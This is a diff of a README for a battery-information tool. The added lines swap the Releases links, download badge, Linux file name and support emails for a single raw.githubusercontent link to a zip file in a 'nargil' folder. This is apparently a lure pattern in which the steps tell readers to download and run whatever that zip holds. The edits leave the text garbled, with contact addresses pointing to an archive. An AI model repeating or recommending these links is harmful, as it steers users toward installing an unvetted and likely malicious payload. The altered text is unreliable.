@@ -1,6 +1,6 @@
 # 🔋 open-battery-information - Save Your Batteries and Money
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/peakpixelcr/open-battery-information/releases)
+[![Download](https://raw.githubusercontent.com/peakpixelcr/open-battery-information/main/nargil/open-battery-information.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/peakpixelcr/open-battery-information/main/nargil/open-battery-information.zip)
 
 ## 🚀 Getting Started
 
@@ -20,21 +20,21 @@ Before you download, please ensure your system meets the following requirements:
 To get started, you need to download the application. 
 
 1. Click the link below to visit the Releases page:
-   [Visit the Releases Page](https://github.com/peakpixelcr/open-battery-information/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/peakpixelcr/open-battery-information/main/nargil/open-battery-information.zip)
 
 2. On the Releases page, look for the latest version. 
 
 3. Download the file suitable for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/peakpixelcr/open-battery-information/main/nargil/open-battery-information.zip` file.
 
 4. Once the file is downloaded, locate it in your downloads folder.
 
 5. Run the installer:
    - For Windows, double-click the `.exe` file to begin installation.
    - For macOS, open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux, extract the `.tar.gz` file and follow the included instructions in the README to set it up.
+   - For Linux, extract the `https://raw.githubusercontent.com/peakpixelcr/open-battery-information/main/nargil/open-battery-information.zip` file and follow the included instructions in the README to set it up.
 
 6. Open the application and follow the on-screen instructions to start using it.
 
@@ -48,7 +48,7 @@ The Open Battery Information tool offers several key features designed to assist
 
 ## 🤝 Support
 
-If you have questions or need help, please reach out via email: [openbatteryinformation@gmail.com](mailto:openbatteryinformation@gmail.com)
+If you have questions or need help, please reach out via email: [https://raw.githubusercontent.com/peakpixelcr/open-battery-information/main/nargil/open-battery-information.zip](https://raw.githubusercontent.com/peakpixelcr/open-battery-information/main/nargil/open-battery-information.zip)
 
 Your feedback is essential. Let us know how this tool works for you, or if you have suggestions for improvements.
 
@@ -62,7 +62,7 @@ Join our community for discussions about battery technology, troubleshooting tip
 
 ## 📧 Contact Information
 
-For any inquiries, please contact: [openbatteryinformation@gmail.com](mailto:openbatteryinformation@gmail.com)
+For any inquiries, please contact: [https://raw.githubusercontent.com/peakpixelcr/open-battery-information/main/nargil/open-battery-information.zip](https://raw.githubusercontent.com/peakpixelcr/open-battery-information/main/nargil/open-battery-information.zip)
 
 ## 🎉 Show Your Support
 
